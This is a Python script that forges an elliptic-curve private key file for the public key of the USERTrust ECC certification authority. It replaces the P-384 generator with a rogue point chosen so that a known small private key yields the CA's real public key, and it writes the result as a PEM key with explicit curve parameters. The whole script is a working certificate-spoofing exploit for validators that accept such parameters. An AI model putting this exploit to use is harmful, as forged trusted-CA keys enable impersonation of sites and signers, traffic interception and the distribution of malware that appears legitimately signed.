from fastecdsa.curve import P384
from fastecdsa.point import Point
from Crypto.Util.asn1 import DerSequence, DerOctetString, DerBitString, DerObjectId
import gmpy2
from Crypto.IO import PEM

def generate_privkey(d, generator):
    """
        Generate a private key with explicit parameters.
    """
    modulus_bytes = 48
    a = P384.a % P384.p
    public_key = d * generator
    generator = (b'\x04' +
        generator.x.to_bytes(modulus_bytes, "big") +
        generator.y.to_bytes(modulus_bytes, "big"))
    public_key = (b'\x04' + 
                    public_key.x.to_bytes(modulus_bytes, "big") +
                    public_key.y.to_bytes(modulus_bytes, "big"))

    field_parameters =  DerSequence([DerObjectId("1.2.840.10045.1.1"), P384.p])
    parameters = [DerSequence([1, field_parameters,
                    DerSequence([
                    DerOctetString(a.to_bytes(modulus_bytes, "big")),
                    DerOctetString(P384.b.to_bytes(modulus_bytes, "big"))]),
                    DerOctetString(generator),
                    P384.q,
                1
            ])]
    seq = [1,
            DerOctetString(d.to_bytes(modulus_bytes, "big")),
            DerSequence(parameters, implicit=0),
            DerBitString(public_key, explicit=1)]
    
    return seq

if __name__ == "__main__":
    # USERTrust ECC Certification Authority public key
    pubkey = b"1aac545aa9f96823e77ad5246f53c65ad84babc6d5b6d1e67371aedd9cd60c61fddba08903b80514ec57ceee5d3fe221b3cef7d48a79e0a3837e2d97d061c4f199dc259163ab7f30a3b470e2c7a1339cf3bf2e5c53b15fb37d327f8a34e37979"
    Q = Point(int(pubkey[0:96],16), int(pubkey[96:],16), curve=P384)
    # Generate rogue generator
    privkey_inv = 2
    # we take the private key as being the inverse of 2 modulo the curve order
    privkey = int(gmpy2.invert(privkey_inv,P384.q))
    # we multply our public key Q with the inverse of our chosen private key value
    rogueG = privkey_inv * Q
    der = DerSequence(generate_privkey(privkey, rogueG))
    # Generate new file
    f = open('p384-key-rogue.pem','w')
    keyfile = PEM.encode(der.encode(), 'EC PRIVATE KEY')
    f.write(keyfile)
    f.close()